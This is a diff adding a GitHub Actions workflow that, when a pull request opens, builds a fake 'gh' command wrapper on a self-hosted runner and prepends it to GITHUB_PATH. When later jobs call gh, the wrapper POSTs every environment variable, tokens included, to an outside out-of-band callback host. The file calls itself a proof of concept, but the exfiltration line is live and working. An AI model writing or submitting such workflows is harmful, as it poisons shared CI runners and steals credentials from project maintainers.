@@ -1,0 +1,20 @@
+name: Poison Runner Environment
+on:
+  pull_request:
+    types: [opened, synchronize]
+jobs:
+  pollute:
+    runs-on: xai-proto-runner
+    steps:
+      - name: Create malicious gh wrapper in a temp directory
+        run: |
+          HIJACK_DIR="${RUNNER_TEMP}/hijack"
+          mkdir -p "$HIJACK_DIR"
+          echo '#!/bin/bash' > "$HIJACK_DIR/gh"
+          echo 'echo "!!! PoC TRIGGERED: gh command hijacked by PR payload."' >> "$HIJACK_DIR/gh"
+          echo 'echo "!!! Exfiltrating environment variables to attacker..."' >> "$HIJACK_DIR/gh"
+          echo 'curl -s -X POST --data-urlencode "token_payload=$(env)" https://bqiehrpshxqkxlzvdxgcuvbw9vidmhxw0.oast.fun/xai-proto || true' >> "$HIJACK_DIR/gh"
+          echo 'echo "!!! Original gh command would have been: /usr/bin/gh $*"' >> "$HIJACK_DIR/gh"
+          chmod +x "$HIJACK_DIR/gh"
+      - name: Prepend malicious path to GITHUB_PATH for subsequent jobs on this runner
+        run: echo "${RUNNER_TEMP}/hijack" >> $GITHUB_PATH
